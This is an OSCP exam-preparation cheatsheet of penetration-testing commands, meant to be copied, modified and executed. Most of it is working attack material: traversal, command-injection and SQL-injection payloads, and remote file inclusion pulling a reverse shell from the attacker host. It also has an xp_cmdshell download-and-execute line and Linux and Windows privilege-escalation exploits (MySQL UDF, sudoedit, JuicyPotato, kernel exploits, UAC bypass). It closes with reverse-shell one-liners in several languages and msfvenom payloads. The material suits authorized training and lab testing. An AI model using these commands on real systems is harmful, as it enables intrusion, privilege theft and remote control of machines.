# OSCP Cheatsheet #

This cheatsheet is done as part of preparation Offensive Security Certified Professional (OSCP) based on Penetration Testing with Kali Linux 2020 (PWK-2020). The objective of this cheatsheet is three-fold:

* **Copy-Paste-Modify-Execute** approach to most relevant commands to save time.
* To recongize that tools are merely tools, the output may even be wrong!
* A reference for the past, present and future.

We assume the following in this document:
* **Scenario:** We are the ATTACKER gaining access to TARGET (Windows/Linux only)
* **IPv4:** TARGET is assumed to use IPv4 only, IPv6 techniques are similar as well
* **Placeholders:** Values in angular brackets e.g. \<VALUE\> should be **replaced**
* **Knowledge:** Basic knowledge of some languages and tools for penetration testing

## 1 Service Enumeration and Exploitation ##

There are only 4 rules, 1 is cliche, 1 is not, 1 is quick and 1 is to not forget:
* **Rule 1:** Enumerate harder and enumerate everything
* **Rule 2:** Run and check **wireshark or tcpdump** for desired packets
* **Rule 3:** Do something while enumeration is happening in the background
* **Rule 4:** Restart service enumeration **again** during the penetration test with any new information found

### 1.1 Port Sanning ###

**Objective:** Identify known ports and attack surface for further enumeration.

```sh
# (1) All ports with T4 speed assuming live host
sudo nmap -T4 -Pn <TARGET IP> -sS -p-

# (2) Aggressive scanning for known ports found in (1) + OS Enumeration
sudo nmap -A -Pn <TARGET IP> -p <PORT1, PORT2, ...>

# (3) UDP Normal Scan (Slow, required if other scanners fail)
sudo nmap -sU <TARGET IP>

# Extra: Connect + Banner-grab a single port with netcat
nc -nvC <TARGET IP> <PORT>

# Extra: More OS enumeration using xprobe2 based on ports (e.g. tcp:445:open)
sudo xprobe2 <TARGET IP> -p <PROTOCOL>:<PORT>:<STATUS>
```

Note: as much as Unicorn-Scan or combinations (e.g. OneTwoPunch) is much faster, they have issues working with VPNs from HackTheBox / Offensive Security Labs.

### 1.2 Web Directory Bruteforcing ###

**Objective:** For any web server, identify possible endpoints. Recursively repeat on each end-point found to the extent where an exploitation vector is revealed., asuming it exists.

```sh
# Python script. Ignores redirects (302) and missing pages (404) 
wfuzz -c -z file,<WORDLIST> --hc 302,404 http://<IP>:<PORT>/FUZZ

# Dirbuster (v2.22) - the "-X" option allows extension specification
dirb http://<IP>:<PORT>/ <WORDLIST>

# Gobuster (v3.0.1) - the "-k" option ignores SSL checking
gobuster dir -w <WORDLIST> -u http://<IP>:<PORT>/

# ffuf (Fuzz Faster U Fool, v1.0.2) - Can fuzz for parameters!
ffuf -c -w <WORDLIST> -u http://<IP>:<PORT>/FUZZ

# Nikto is for enumeration, good for obscure web servers (e.g. coldfusion)
nikto -h <TARGET IP>
```

### 1.3 Web Directory Traversal (DT) / Local File Inclusion (LFI) ###

**Objective:** Given a web server, enumerate files outside of the web root to find sensitive information (e.g. passwords, hashes, ssh-keys etc.) by using the parent folder reference (../).

```sh

# Example: http://<IP>:<PORT>/../../../../../<FILE TO RETRIEVE>

../                 # Normal directory traversal
..%2f               # HTML encoding for '/' character
%2e%2e%2f           # More Encoding
%252e%252e%252f     # Even More Encoding
%c0%ae%c0%ae%c0%af  # Even Much More encoding
%uff0e%uff0e%u2215  # Unicode Encoding
%uff0e%uff0e%u2216  # Even More Unicode Encoding
..%01/              # Webmin service
..././              # Special case #1
/???/               # Special case #2
```

### 1.4 Remote File Inclusion (RFI) ###

**Objective:** Given a web server, force the web server to render a file supplied on another website, typically to gain user access.

```sh
# Example of RFI
http://<TARGET IP>:<PORT>/path/to/some/file.ext?location=http://<ATTACKER IP>:<PORT>/<REVERSE SHELL FILE>
```

Note: If using apache instead for PHP Remote-File Inclusion (RFI), it will **FAIL** since PHP is rendered locally first, leading to RFI on ourselves.

### 1.5 NetBios Scan ###

**Objective:** Reveal NetBios names shared using the NetBios protocol.

```sh
# Reveal NetBios Name (and associated information)
nbtscan <TARGET IP>
nmblookup <TARGET IP>
```

### 1.6 SMB ###

**Objective:** Identify access of shares and enumerate corresponding content

```sh
# Check for known SMB vulnerabilities
sudo nmap --scripts=smb-vuln* <TARGET IP> 

# List available shares/permissions via null session (add "-U guest" for guest session)
smbmap -H <TARGET IP>

# Connect to known SMB Share (use -U ""%"" for a null session)
smbclient \\\\<TARGET IP>\\<SHARE NAME>\\ -U "<USERNAME>"%"<PASSWORD>"

# Common - Eternal Blue Exploit (MS17-010) - Either match_pairs / fish_barrel is used
# https://github.com/helviojunior/MS17-010 (Fork with send_and_execute.py)
msfvenom -p <WINDOWS PAYLOAD> LHOST=<ATTACKER IP> LPORT=<LISTENING PORT> -o shell.exe
python send_and_execute.py <TARGET IP> shell.exe
```

Note: If "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED" is received during SMB connection, proceed to smb.conf and modify "client min protocol" as required (e.g. to LANMAN1).

### 1.7 FTP ###

**Objective:** Access sensitive files with credentials or upload reverse shells to be executed elsewhere. 

```sh
# FTP Login to particular IP
ftp <TARGET IP>
> Username (e.g. anonymous)
> Password (e.g. "")

# CRD commands on FTP
> get <REMOTE FILE>
> put <LOCAL FILE>
> delete <REMOTE FILE>

# Possible Directory Traversal (e.g. HomeFTPServer)
> get ../../../../<ABSOLUTE PATH TO REMOTE FILE>

# Old favourite (vsftpd 2.3.4): https://www.exploit-db.com/exploits/17491

# TFTP is a notable exception running on UDP port 69 - use tftp-hta instead for tftp!
# - Note: Instead of C:\path\to\a program\file.exe, use /path/to/a program/file.exe
tftp <TARGET IP> -c status # Check if it exists
tftp <TARGET IP> -m binary -c get '<PATH TO FILE>' #Binary mode is more accurate...
```

### 1.8 Wordpress ###

**Objective:** Identify vulnerable wordpress plugins, version and launch dictionary attacks against the admin login page.

```sh
# Scan for wordpress version and plugins installed
wpscan --url http://<TARGET IP>:<PORT>

# Enumerate users and launch dictionary attack on wordpress login
wpscan --passwords <WORDLIST> --url http://<TARGET IP>:<PORT>

# PHPass ($P$....) hash cracking with Hashcat (v.5.1.0)
hashcat -m 400 -a 0 --force <FILE WITH HASH> <WORDLIST>

# WP Admin Access = Insert PHP Reverse Shell in Theme = Low-Privilege SHell
```

### 1.9 SQL ###

**Objective:** Bypass logins, obtain user credentials, launch reverse shell and create user-defined functions (UDF)

```sh
# Note: For all commands below, add ', ", ;, etc. for valid SQL syntax

# Basic SQL Injection (To bypass logins)
' OR 1=1 --
' OR '1'=1

# Union injection (Type and Number of columns must be same)
UNION SELECT <COLUMN 1, ...> FROM <DATABASE>.<TABLE>

# Stacked Queries Injection (Close previous query e.g. with ', " etc., followed by ;)
<CLOSE PREVIOUS QUERY>; <YOUR SQL QUERY>

# Time-Based Injection [A Stacked QUery] (e.g. wait 5 seconds)
; WAITFOR DELAY '0:0:5'; --

# Versioning
SELECT @@version # Version of MySQL
SELECT version() # Version of PgSQL
SELECT @@version # Version of MSSQL

# Enumeration for Most Databases (e.g. MySQL / MSSQL)
SELECT name FROM master.dbo.sysdatabases # All databases
SELECT table_name FROM <DATABASE>.information_schema.tables # All tables in DB
SELECT column_name FROM <DATABASE>.information_schema.columns WHERE table_name='<TABLE>' # All columns in table

# Enumeration for Oracle PLSQL Database (Errors have "ORA Exception ...")
SELECT table_name from all_tables # All tables in DB
SELECT column_name FROM all_tab_cols WHERE table_name=<TABLE> # All columns in table

# MSSQL .mdf files (master.mdf contains the "sa" user password hash)
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf # Master DB
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\BACKUP\master.mdf # Backup DB
# Extract sa hash from MDF: https://blog.xpnsec.com/extracting-master-mdf-hashes/

# MSSQL xp_cmdshell with "sa" (add "go" after each command if interactive)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE; 
EXEC xp_cmdshell 'powershell -c IEX(New-Object System.Net.WebClient).DownloadString(\"http://<ATTACKER IP>:<HTTP SERVER PORT>/powercat.ps1\");powercat -c <ATTACKER IP> -p <ATTACKER LISTENING PORT> -e \"cmd.exe\"'; --

# MySQL User-Defined Function (UDF) exploit (https://www.exploit-db.com/exploits/1518) - Typically for local privilege escalation!
echo "import os; os.setgid(0); os.setuid(0); os.system('/bin/bash')" >> suid.py
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
> USE mysql;
> CREATE table foo(line blob);
> INSERT INTO foo VALUES(load_file('/tmp/raptor_udf2.so'));
> SELECT * FROM foo INTO dumpfile '/usr/lib/raptor_udf2.so';
> CREATE function do_system returns integer soname 'raptor_udf2.so';
> SELECT * FROM mysql.func; # Verify UDF do_system() is created
...
> SELECT do_system('chmod 04755 /bin/python');
# Execute "python suid.py" to obtain root shell
# Note: suid.py can be replaced with a C version (apply chmod on ELF instead)
```

### 1.10 Command Injection ###

**Objective:** If a specific system command can be executed, attempt to execute another command after it. Sometimes this involves bypassing a Regex (Regular Expression) filter.

```sh
# Standard example (e.g. ping -c 1 <FILL IN THE FOLLOWING>), <COMMAND> is what you want executed
;<COMMAND>
%0a<COMMAND>
| <COMMAND>
|| <COMMAND>
&& <COMMAND>
```

### 1.11 File Filter Bypass ###

**Objective:** If a file upload function has filters in place, attempt to bypass the filter for successful file upload. Some possible techniques include:
* Adding `%00` for **null-byte injection** to prevent automatic extension being appended (e.g. .php, .txt etc.)
* Prepend `GIF89a` to fool mechanism to treat it as a .gif file
* Change `Content-Type` to `image/png` to fool mechanism to treat it as a .png file

### 1.12 Escaping Restricted Bash ###

**Objective:** Obtain a fully functional shell from a restricted shell (e.g. rbash / rksh / rzsh / lshell etc.) Some examples are outlined below:

```sh
# This is a list of possibilities, refer to specific shell for escape options
awk 'BEGIN {system("/bin/sh")}'
BASH_CMDS[a]=/bin/sh;a
echo os.system("/bin/bash");
ed                                  # !'/bin/sh'
expect                              # Use "spawn sh" first, then "sh" after
find / -name test -exec /bin/sh \;
irb                                 # Interactive ruby - exec '/bin/sh'
more                                # (works for less / man etc. [pager commands]) - !'sh'
mutt                                # click on "!" --> /bin/sh
nmap --interactive
perl -e 'system("sh -i");'
php -a                              # Interactive PHP - exec("sh -i");
vi                                  # (or vim) - Run in command mode --- :!/bin/sh
```

### 1.13 Password Cracking and Bruteforce ###

**Objective:** Given a login screen / hash, enumerate all possibilities for a correct credential. Knowing either user and/or password significantly reduces the search space. Examples below are using **dictionary attacks** but you can bruteforce in practice with the same tools as well.

```sh
# Hydra Bruteforce for SSH (other protocols possible too) - 5 parallel tasks
hydra -l <USER> -P <WORDLIST> <TARGET IP> -t 5 ssh

# Unshadow tool (combine /etc/passwd and /etc/shadow) [output as "unshadowed"]
unshadow <PASSWD FILE> <SHADOW FILE> > unshadowed

# John-The-Ripper
# Note: <PASSWORD FILE> contains the form "user:hash", 1 per line
john <PASSWORD FILE> --show --wordlist=<WORDLIST>

# Hashcat - Launch dictionary attack by force [Non-GPU]
# Note: <HASH FILE> contains the form "hash", 1 per line
# Refer to https://hashcat.net/wiki/doku.php?id=hashcat for right <MODE> to use
hashcat -m <MODE> -a 0 --force <HASH FILE> <WORDLIST>
```

## 2 Local Privilege Escalation (LPE) ##

There are 3 primary categories to look out for:
* **Mis-configuration:** A software was configured to not run securely
* **Vulnerable Software:** Non-default software located on system is vulnerable
* **Kernel Exploit:** A kernel exploit is available to direct perform LPE

Once relatively certain on LPE vector, search online and attempt to apply exploit. Exploits that are widely applicable / easy to perform are outlined below as well.

### 2.1 Linux Local Privilege Escalation ###

Standard commands to enumerate the system:

```sh
# Current user and privileges
id      # Information of current user e.g. membership in groups (sudo etc.)
sudo -l # List of commands current user can execute as sudo
whoami  # Currently logged on user

# System information
cat /etc/issue          # Display the current issue of OS (e.g. Ubuntu)
cat /etc/lsb-release    # Debian-based linux
cat /etc/redhat-release # Redhat-based Linux
cat /proc/version       # Version of linux kernel
dmesg | grep Linux      # Versio nof linux kernel
uname -a                # System information e.g. hostname, kernel version etc.

# User and Enviroment Information
cat ~/.bash_history     # Check past commands executed by user
cat ~/.bash_profile     # Profile settings when login to shell for this user
cat ~/.nano_history     # Past nano commands executed
cat ~/.mysql_history    # Past MySQL commands executed
cat ~/.php_history      # Past PHP commands executed
cat /etc/groups         # Groups users belong to on system
cat /etc/passwd         # Users on system
cat /etc/shadow         # Password hashes of users on system
env                     # List of current environment variables
ls -lah ~/.ssh          # Look for SSH-related information for current user
ls -lahR /home/         # Look for information in user home directories
ls -lahR /root/         # Look for information in root home directory
ls -lah /var/mail       # Possible mail for the current user
ls -lah /var/spool.mail # Possible mail for the current user

# Scheduled Tasks
crontab -l          # List cron jobs for current user
cat /etc/cron*      # List all possible cron jobs running thus far

# Printer
lpstat -a   # Check for any attached printers

# Network information
arp -a                      # Dump Address Resolution Protocol (ARP) cache
cat /etc/hosts              # Hosts file to check mapping of hostnames to IPs
cat /etc/network/interfaces # Network interfaces configured on the system
cat /etc/resolv.conf        # Configuration for DNS resolver of system
cat /etc/sysconfig/network  # Check for possiblity of connection to other networks
dnsdomainname               # DNS domain name of current system
hostname                    # Hostname of current system
ifconfig -a                 # Usually in in /sbin, displays IP information
iptables -L                 # List current iptables firewall configuration
ip addr                     # Similar to ifconfig, Displays IP information
netstat -antup              # Display open TCP / UDP ports
ss                          # Similar to netstat, for systems without netstat
ufw status                  # Uncomplicated FireWall status (e.g. Ubuntu)

# Processes
cat /etc/services       
ps -aux | grep root     # List processes executed by root

# Applications and Versions
dpkg -l                             # Applications installed from Debian packges
ls -lah /usr/bin                    # Applications in /usr/bin
ls -lah /usr/local/bin              # Applications in /usr/local/bin
ls -lah /sbin                       # Applications in /sbin
ls -lah /var/cache/apt/archives0    # Applications installed via apt (e.g. Ubuntu)
ls -lah /var/cache/yum              # Applications installed via yum (e.g. CentOS)
rpm -qa                             # Applications installed via rpm

# World readable / writable files
find /etc/ -readable -type -f 2>/dev/null               # World-readable in /etc/
find /etc/ -writable -type -f -maxdepth 1 2> /dev/null  # World-writable in /etc/

# Permission bits (4000 = SUID, 2000 = SGID, 6000 = 4000 + 2000 = SUID and SGID)
find /usr/bin/ -perm 4000                               # SUID set in /usr/bin
find /usr/local/bin/ -perm 4000                         # SUID set in /usr/local/bin
find /sbin/ -perm 4000                                  # SUID set in /sbin

# Other special things
w                       # Other users logged onto the system
cat /etc/motd           # Message of the day, possibly triggered on login
```

Docker exploit (if we are in a docker container)
```sh
# Mount new volume '/' as '/mnt' in shell mode with alpine image, chrooted to '/mnt' with "sh" as shell
/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# As root in container (not machine!), we add a new user (user / password):
useradd user
passwd user # set to "password"
usermod -aG sudo user # Add "user" to "sudo" group

# In a separate session, SSH as sudo user
ssh user@<TARGET IP> # password = "password"
sudo su
```

Nmap exploit (if sudo -l allows for nmap)
```sh
# Check for nmap version and sudo nmap ability:
nmap -V && sudo -l

# Nmap 2.02 to 5.21 Interactive shell
nmap --interactive
> !sh 

# Nmap > 5.21 - Send a reverse shell back to <ATTACKER IP>:<LISTENING PORT> via Nmap Script
echo 'os.execute("/bin/bash >& /dev/tcp/<ATTACKER IP>/<LISTENING PORT> 0>&1")' > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

Sudoedit exploit (if "sudo -l" allows for sudoedit)
```sh
# Check for sudo version and sudo privileges of current user
sudo -v && sudo -l

# LPE for sudo (1.6.x < 1.69p21 / 1.7.x < 1.7.2p4) (https://www.exploit-db.com/exploits/11651)
# Need: <user_to_grant_priv> ALL=(root) NOPASSWD: sudoedit /path/to/file.ext
cd /tmp
cat << EOF >> /tmp/sudoedit
#!/bin/sh
su
/bin/su
EOF
chmod a+x /tmp/sudoedit             # Create /tmp/sudoedit for "sudo su"
sudo ./sudoedit /path/to/file.ext   # Run /tmp/sudoedit instead

# LPE for sudo <= 1.8.14 (https://www.exploit-db.com/exploits/37710)
# Need: Fully interactive shell
# Need: <user_to_grant_priv> ALL=(root) NOPASSWD: sudoedit /path/to/*/*/file.ext
cd /path/to/some_writable_folder                        # First wildcard = some_writable_folder
mkdir newdir                                            # Second wildcard = newdir
ln -s /etc/shadow file.ext                              # file.txt now points symlinks to /etc/shadow
openssl passwd -6 -salt salt letmein                    # Geenerate SHA-256 hash for "letmein" (see below)
sudoedit /path/to/some_writable_folder/newdir/file.txt  # Editing /etc/shadow
# Modify root hash to: $6$salt$MFNUp7F4YTbLV4n2ACWMTOp6oLDg9indnt.hbnX9S7Qx1YhgfGxYg0dFJARrRXwCa0ghc.86/AIIYQqBzFfh/.
sudo su                                                 # Log in as root with "letmin" as password
```

### 2.2 Windows Local Privilege Escalation ###

Standard commands to enumerate the system (just in case, REM = comment):

```bat

REM User information
echo %username%         REM Current user
net group /domain       REM List of groups on the domain
net localgroups         REM List of local groups on the system
net users               REM List of current local users
net users /domain       REM List of current domain users
net user <USERNAME>     REM Details of user <USERNAME> (e.g. Group memberships)
whoami                  REM Current user (reliable on Windows 7+)
whoami /groups          REM List of groups user is in (Indicates Shell Level)
whoami /priv            REM List of privileges for current user

REM System information
hostname                                                REM hostname
systeminfo                                              REM Architecture, OS build, Hotfixes etc.
wmic qfe get Caption,Description,HotFixID,InstalledOn   REM Installed hotfix information

REM Network information
arp -A                          REM Dumps Address Resolution Protocol (ARP) cache
ipconfig /all                   REM Display all IP-related information
netsh firewall show state       REM Display current state of firewall
netsh firewall show config      REM Display current configuration of firewall
netstat -ano                    REM Show open ports (e.g. internal-only services)

REM Common location for passwords (Filesystem and Registry)
findstr /si password *.<EXT>                                            REM Search for "password" on all .<EXT> files
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  REM Windows autologon credentials
reg query HKCU /f password /t REG_SZ /s                                 REM Search for "password" in HKCU
reg query HKLM /f password /t REG_SZ /s                                 REM Search for "password" in HKLM
type C:\sysprep\sysprep.inf                                             REM base64-encoded system credentials
type C:\sysprep\sysprep.xml                                             REM base64-encoded system credentials
type C:\unattended.xml                                                  REM Possible system credenials

REM Scheduled tasks
schtasks /query /fo LIST /v REM Display all scheduled tasks

REM Services
net start                                  REM Services started on Windows startup
net stop <SERVICE> && net start <SERVICE>  REM Stop, then start <SERVICE>
sc query state= all                        REM Output information of all services
sc qc <SERVICE>                            REM Output <SERVICE> information e.g. Path to Binary .exe
tasklist /SVC                              REM Display running processes and associated services
wmic service list brief                    REM Output information of all services
wmic service <SERVICE> call startservice   REM Restart <SERVICE>

REM Permissions (cacls.exe = XP and before, icacls.exe = Vista and later)
accesschk.exe -ucqv <SERVICE> /accepteula       REM Check for service permissions
accesschk.exe -uwcqv "<GROUP>" * /accepteula    REM Check for write access to any service(s) as <GROUP>
icacls "C:\path\to\file.exe"                    REM Display file permissions (want BUILTIN\USERS (F)/(M) prefably)

REM Unquoted File Paths (e.g. C:\AB CD\file.exe -> C:\AB.exe runs first!)
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"

REM Display all drivers (hope for vulnerable one)
driverquery

REM AlwaysInstallElevated check (.msi files installed with elevated privileges)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

Windows-Exploit-Suggester (using systeminfo output, executed locally on Kali)
```sh
python windows-exploit-suggester.py --update                        # Generate XLS file
python windows-exploit-suggester.py -i systeminfo.txt -d <XLS file> # Generate LPE suggestions
```

UpnpHost Service Exploit (typically Windows XP <= SP1 and below)
```bat
sc qc upnphost
sc config upnphost binpath= "C:\path\to\nc.exe -nv <ATTACKER IP> <LISTENING PORT> -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost
```

JuicyPotato Exploit (SeImpersonatePrivilege on Windows <= 10 / <= Server 2016)
```sh
# Download precompile EXE file for execution
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
sudo python -m SimpleHTTPServer 80
```
```bat
REM Download the exploit
certutil -urlcache -split -f http://<IP>:<PORT>/JuicyPotato.exe juicypotato.exe
REM Check for BITS (pref.) service running, others applicable are OK too
wmic service get name,startname     
REM Search for CLSID of a desired servie on http://ohpe.it/juicy-potato/CLSID/
REM Send reverse shell back to ourselves using downloaded nc.exe
juicypotato.exe -l 1337 -p "C:\windows\system32\cmd.exe" -a "/c C:\path\to\nc.exe <ATTACKER IP> <LISTNEING PORT> -e cmd.exe" -t * -c {<SERVICE CLSID>}
```

afd.sys Kernel Exploit (MS11-046, x86, Unpatched Windows 7 / Server 2008 or earlier)
```sh
# Cross-Compile Exploit on Kali first
seachsploit -x 40564 > 40564.c
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
sudo python -m SimpleHTTPServer 80
```
```bat
REM Execute afd.sys exploit on target system
certutil -urlcache -split -f http://<IP>:<PORT>/40564.exe 40564.exe
40564.exe
```

TrackPopUpMenu Privilege Escalation (MS14-058, Windows 8.0/8.1 x64)
```sh
# Obtain Python file from EDB first
searchsploit -x 37064 > 37064.py
```
```bat
REM Execute Python file on target system (with local Python installation)
certutil -urlcache -split -f http://<IP>:<PORT>/37064.py 37064.py
C:\path\to\python.exe C:\path\to\37064.py
```

'RGNOBJ' Integer Overflow (MS16-098, Windows 8.1, x64) 
* https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/
```sh
# Extract exploit C file from ExploitDB and cross-compile it
searchsploit x 41020 > 41020.c
x86_64-w64-mingw32-gcc 41020.c -o 41020.exe -lws2_32
sudo python -m SimpleHTTPServer 80
```
```bat
REM Execute Integer Overflow exploit on target system
certutil -urlcache -split -f http://<IP>:<PORT>/41020.exe 41020.exe
41020.exe
```

COMahawk Local Privilege Escalation (Windows 10 Build 1803 < 1903)
```bat
REM Reference to EDB 47684, assume exploit saved as "exploit.exe"
exploit.exe             REM Run Exploit
net users tomahawk      REM Check "tomahawk" added as Administrator

REM Now, login as tomahawk / ribst3ak69 (lower case for all)
```

User Account Control (UAC) Bypass (Administrator User with Medium-Priv Shell)
* Many Methods: https://github.com/hfiref0x/UACME
* Example: Using EventVwr since it runs commands at "highest privilege possible": [https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/](https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/)
```bat
REM Check for Non-Strict Settings 
REM - EnableLUA    REG_DWORD    0x1 (0 = No Bypass, 1 = UAC Active)
REM - ConsentPromptBehaviorAdmin=2 and PromptOnSecureDesktop=1 -- DIFFICULT
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

REM If Ok, we use EventVwr for a bypass https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
```
```sh
# C file Exploit for EventVwr Bypass, cross compile first (e.g. x86)
wget https://github.com/turbo/zero2hero/blob/master/main.c
i686-w64-mingw32-gcc main.c -o uacbypass.exe # Run on Windows!
sudo python -m SimpleHTTPServer 80 # Host exe file for download...
```
```bat
REM EventVwr Bypass Powershell Script
https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1
powershell.exe
.\Invoke-EventVwrBypass.ps1
```
```bat
REM EventVwr Bypass Manual Registroy Overwrite (same effects as above)
reg query HKCU\Software\Classes\mscfile\shell\open\command
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "C:\path\to\nc.exe <ATTACKER IP> <LISTENING PORT> -e cmd.exe" /f
reg query HKCU\Software\Classes\mscfile\shell\open\command
```

Switching execution as another user (e.g. after UAC bypass etc.) to send a reverse netcat high-privilege shell
```bat
 psexec64.exe -accepteula -u <ADMIN USER> -p <ADMIN PASSWORD> C:\path\to\nc.exe <ATTACKER IP> <LISTENING PORT> -e cmd.exe
```

Optional: "Possible switch" from Local Administrator to NT AUTHORITY\SYSTEM
```sh
# Generate a reverse shell with appropriate payload + start listening shell
msfvenom -p <REVERSE SHELL PAYLOAD> LHOST=<ATTACKER IP> LPORT=<PORT> -f exe -b "\x00" > getsystem.exe
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp <PORT> # On another shell
```
```bat
REM Download file, create a service for it and start it
certutil -urlcache -split -f http://<IP>:<PORT>/getsystem.exe C:\getsystem.exe
sc create myservice binpath= "C:\getsystem.exe" type= own type= interact
sc start myservice
```

### 2.3 Cross-Compilation of C/C++ Files on Kali Linux ###

Many kernel exploits may require compilation of C files (e.g. exploit.c) to work. We should **first try to directly obtain a pre-compiled version**. A couple of things to take note as well before compiling:
* For C++ files (.cpp), use g++ instead of gcc where applicable
* add "-Wl,hash-style=both" for both GNU/sysv runtime hashtable resolution compatability
* add "-lws2_32", the library for exploits requiring the WinSock2 API

```sh
# Linux (using gcc directly on TARGET system)
gcc exploit.c -o exploit

# Cross-Compile Linux x86-based systems
gcc -Wl,hash-style=both exploit.c -o exploit -m32

# Cross-Compile Linux x86_64-based systems
gcc -Wl,hash-style=both exploit.c -o exploit

# Cross-Compile Windows x86-based systems
i686-w64-mingw32-gcc exploit.c -o exploit.exe

# Cross-Compile Windows x86_64-based systems
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
```

## 3 Important Utility Techniques ##

The following summarizes useful techniques in different scenarios.

### 3.1 Bind / Reverse Shell Connection ###

* Trivia #1: MSF payloads with '_' are single-stage, '/' is multi-stage
* Trivia #2: MSF exploit/multi/handler can handle multi-stage payloads
* Trivia #3: TARGET listening = Bind shell and ATTACKER listening = Reverse shell
* Trivia #4: \<SHELL\> placeholder can be /bin/bash (Linux), cmd.exe (Windows) etc.

```sh
# Netcat connect to another shell (-e option need use our own nc)
nc <IP> <LISTENING PORT> -e <SHELL>
# Netcat listening for shell connection, non-staged shell only
nc -nlvp <LISTENING PORT> 

# Socat connect to another shell
socat TCP4:<IP>:<LISTENING PORT> EXEC:<SHELL>
# Socat listening for shell connection, non-staged shell only
socat -d -d TCP4-LISTEN:<LISTENING PORT> STDOUT
```

PHP 1-liner reverse shell connection
```php
<?php shell_exec("/bin/bash >& /dev/tcp/<IP>/<LISTENING PORT> 0>&1") ?>
```

Python 1-liner reverse shell connection (wrap with "python -c" if required)
```py
import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<LISTENING PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("<SHELL>")
```

Powershell reverse shell connection
```ps
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>",<LISTENING PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Lua reverse shell connection (wrap with "lua -e" if required)
```lua
local host, port = "<IP>", <LISTENING PORT> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()
```


MSF (msfvenom) payloads for bind / reverse shells

```sh
# To view the full list of msfvenom payloads, use "msfvenom -l payloads"

# Meterpreter (Note: Only use on 1 machine for OSCP exam [PWK-2020])
msfvenom -p windows/x64/meterpreter_bind_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT>

# Standard linux bind shells
msfvenom -p linux/x86/shell_bind_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p linux/x64/shell_bind_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p linux/x86/shell/bind_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p linux/x64/shell/bind_tcp LHOST=<IP> LPORT=<LISTENING PORT>

# Standard linux reverse shells
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT>

# Standard windows bind shells (not x64 = x86)
msfvenom -p windows/shell_bind_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p windows/x64/shell_bind_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p windows/shell/bind_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p windows/x64/shell/bind_tcp LHOST=<IP> LPORT=<LISTENING PORT>

# Standard windows reverse shells (not x64 = x86)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT>
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT>

# Some formatting options for various applications (append after shell)
-f asp > shell.asp          # ASP, good for IIS Servers
-f aspx > shell.aspx        # ASPX, good for IIS servers
-f aspx-exe > shell.aspx    # ASPX, good for IIS servers
-f c                        # C shell-code generation (stdout)
-f elf > shell              # ELF file, good for linux command injection
-f elf-so > shell.so        # .so file, good for linux purposes
-f exe > shell.exe          # Windows executable, good for windows command injection
